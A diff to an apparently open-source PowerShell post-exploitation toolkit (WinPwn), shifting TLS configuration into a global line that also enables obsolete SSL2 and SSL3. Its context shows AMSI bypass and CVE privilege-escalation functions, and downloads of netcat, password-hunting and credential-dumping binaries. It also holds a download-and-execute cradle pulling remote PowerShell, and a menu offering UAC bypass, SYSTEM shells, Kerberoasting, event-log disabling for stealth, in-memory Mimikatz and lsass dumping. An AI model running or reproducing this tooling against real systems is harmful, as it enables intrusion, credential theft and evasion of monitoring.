@@ -1,3 +1,5 @@
+#  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter.
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
 
 function AmsiBypass
 {
@@ -1094,7 +1096,7 @@ function CVE-2020-0683-lpe
 function CVE-2019-1215
 {
     testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
 		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
@@ -1117,7 +1119,7 @@ function CVE-2019-1215
 function ms15-077
 {
     testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
 		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
@@ -1143,7 +1145,6 @@ function ms15-077
 }
 function Juicypot
 {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     testtemp
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
@@ -1170,7 +1171,6 @@ function Juicypot
 function CVE-2018-8120
 {
     testtemp
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
 		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
@@ -1189,7 +1189,7 @@ function CVE-2019-0841
 {
     testtemp
     iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
 		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe' -Outfile C:\temp\nc.exe
@@ -1239,7 +1239,7 @@ function CVE-2019-1069
       {
         $username = Read-Host -Prompt 'Please enter the username'
         $password = Read-Host -Prompt 'Please enter the password'
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 		if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 		{
 			Invoke-Webrequest -Uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
@@ -2089,7 +2089,6 @@ function Passhunt
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
 		if (!(test-path $currentPath\passhunt.exe))
 		{
-			[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 			if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 			{
 				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
@@ -2108,7 +2107,6 @@ function Passhunt
        }
         if ($local)
         {
-            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             if (!(test-path $currentPath\passhunt.exe))
 			{
 				if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
@@ -2139,7 +2137,6 @@ function Passhunt
         }
         else
         {
-            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 			{
 				Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
@@ -3925,7 +3922,6 @@ function laZagnemodule
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
 	{
 		Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/blob/master/exeFiles/wincreds.exe?raw=true' -Outfile $currentPath\WinCreds.exe
@@ -4737,18 +4733,18 @@ __        ___       ____
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
         Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
         Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '
-		Write-Host -ForegroundColor Green '6. Bypass UAC! '
-		Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
+	Write-Host -ForegroundColor Green '6. Bypass UAC! '
+	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
         Write-Host -ForegroundColor Green '8. Kerberoasting! '
         Write-Host -ForegroundColor Green '9. Loot local Credentials! '
         Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '
         Write-Host -ForegroundColor Green '11. Sessiongopher! '
         Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
-		Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
-		Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
-		Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
-		Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
-		Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
+	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
+	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
+	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
+	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
+	Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
         Write-Host -ForegroundColor Green '18. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
